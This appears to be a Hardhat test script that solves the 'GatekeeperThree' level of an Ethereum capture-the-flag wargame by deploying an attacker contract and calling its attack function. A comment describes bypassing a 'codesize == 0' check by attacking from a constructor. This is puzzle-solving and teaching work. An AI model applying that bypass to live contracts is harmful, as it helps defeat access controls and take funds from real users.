const { expect } = require("chai");
const { createChallenge, submitLevel } = require("./utils");

async function getChallenge() {
  const factory = await ethers.getContractFactory("GatekeeperThree");
  // Since this challenge is created by the challengeFactory, we cannot tackle the gates one by one.
  const challengeAddress = await createChallenge(`0x653239b3b3E67BC0ec1Df7835DA2d38761FfD882`)
  const challenge = factory.attach(challengeAddress);
  return challenge;
}

it("Solves 28-GatekeeperThree", async function () {
  const challenge = await getChallenge();
  const factory = await ethers.getContractFactory("GatekeeperThreeAttacker");

  // Attacking within the constructor bypasses the `codesize == 0` check.
  const contract = await factory.deploy(await challenge.getAddress(), {value: ethers.parseEther("0.002")});
  await contract.waitForDeployment();

  await contract.attack();

  expect(await submitLevel(await challenge.getAddress())).to.equal(true);
});
